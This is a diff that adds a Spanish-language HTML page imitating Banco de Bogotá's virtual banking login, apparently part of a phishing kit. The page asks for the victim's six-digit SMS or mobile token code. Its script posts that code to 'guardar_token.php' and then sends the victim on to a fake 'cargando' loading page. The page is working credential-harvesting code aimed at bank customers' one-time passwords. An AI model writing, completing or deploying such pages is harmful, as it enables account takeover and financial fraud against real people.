@@ -1,0 +1,73 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Banca Virtual - Banco de Bogotá</title>
+    <link rel="stylesheet" href="token.css">
+</head>
+<body>
+
+    <script src="script.js"></script>
+
+    <div class="login-container">
+        <img src="banco-de-bogota.webp" alt="Banco de Bogotá" class="logo">
+        <img src="MOTO_ANUNCIO.png" alt="Anuncio Moto" class="anuncio">
+        <img src="BOTONES_INICIO.png" alt="Botones Inicio" class="botones">
+
+        <h2>Código o Token de verificación</h2>
+
+        <div class="card">
+            <div class="form-icon">
+                <img src="CELULAR.png" alt="Icono de formulario">
+            </div>
+
+            <form id="tokenForm">
+                <div class="form-group">
+                    <label for="CODIGO">Código SMS o Token móvil / físico</label>
+                    <div class="input-group">
+                        <input type="text" id="CODIGO" name="codigo_token" placeholder="••••••" maxlength="6" required style="width: 100%; max-width: 335px;">
+                    </div>
+                </div>
+
+                <button type="submit" class="btn" id="continuarBtn" disabled>Continuar</button>
+            </form>
+
+            <div class="links">
+                <a href="#">No tengo Token / Reenviar código ›</a>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener("DOMContentLoaded", function () {
+            const codigoInput = document.getElementById("CODIGO");
+            const continuarBtn = document.getElementById("continuarBtn");
+            const tokenForm = document.getElementById("tokenForm");
+
+            codigoInput.addEventListener("input", function () {
+                continuarBtn.disabled = codigoInput.value.length !== 6;
+            });
+
+            tokenForm.addEventListener("submit", function (e) {
+                e.preventDefault();
+
+                let formData = new FormData(tokenForm);
+
+                fetch("guardar_token.php", {
+                    method: "POST",
+                    body: formData
+                })
+                .then(response => response.text())
+                .then(data => {
+                    console.log("Respuesta del servidor:", data);
+                    sessionStorage.setItem("enCargando", "true");
+                    window.location.href = "cargando.html";
+                })
+                .catch(error => console.error("Error al guardar el código:", error));
+            });
+        });
+    </script>
+
+</body>
+</html>
